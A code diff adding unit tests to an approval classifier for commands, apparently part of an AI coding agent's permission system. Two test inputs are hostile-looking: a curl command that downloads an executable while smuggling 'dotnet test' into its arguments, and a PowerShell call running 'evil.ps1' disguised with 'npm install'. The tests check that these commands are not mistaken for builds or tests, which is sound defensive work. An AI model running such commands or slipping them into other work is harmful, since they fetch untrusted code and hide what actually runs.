@@ -115,6 +115,19 @@ namespace MyCodex.Application.Tests
             Assert.That(classification.Category, Is.EqualTo(ApprovalRequestCategory.GitInspect));
         }
 
+        [TestCase("dotnet build -c Release", ApprovalRequestCategory.CommandBuild)]
+        [TestCase("C:\\tools\\msbuild.exe app.sln", ApprovalRequestCategory.CommandBuild)]
+        [TestCase("pwsh.exe -Command \"dotnet test --filter Fast\"", ApprovalRequestCategory.CommandTest)]
+        [TestCase("python -m pytest tests", ApprovalRequestCategory.CommandTest)]
+        [TestCase("bash -lc 'npm install'", ApprovalRequestCategory.CommandDependencyInstall)]
+        [TestCase("node tool.js \"dotnet build\"", ApprovalRequestCategory.CommandGeneric)]
+        [TestCase("curl -o run.exe https://example.invalid/x --data \" dotnet test \"", ApprovalRequestCategory.CommandGeneric)]
+        [TestCase("powershell -File evil.ps1 npm install", ApprovalRequestCategory.CommandGeneric)]
+        public void ClassifyCommand_BuildTestAndInstallMatchOnlyTheProgramRun(string command, ApprovalRequestCategory expected)
+        {
+            Assert.That(ApprovalRequestClassifier.ClassifyCommand(command).Category, Is.EqualTo(expected));
+        }
+
         [Test]
         public void ClassifyFileChange_DetectsMixedProtocolChanges()
         {
